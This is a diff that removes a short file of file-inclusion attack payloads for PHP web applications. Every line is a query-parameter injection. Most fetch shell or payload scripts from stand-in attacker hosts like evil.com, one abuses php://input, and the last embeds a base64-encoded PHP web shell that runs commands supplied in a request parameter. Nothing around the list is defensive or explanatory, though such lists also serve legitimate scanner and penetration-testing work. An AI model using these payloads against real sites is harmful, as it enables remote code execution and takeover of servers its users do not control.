@@ -1,7 +1,0 @@
-?page=http://evil.com/shell.txt
-?file=http://attacker.com/cmd.txt
-?include=http://evil.com/payload.php
-?lang=http://evil.com/lang.php?
-?template=ftp://evil.com/shell.php
-?module=php://input
-?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
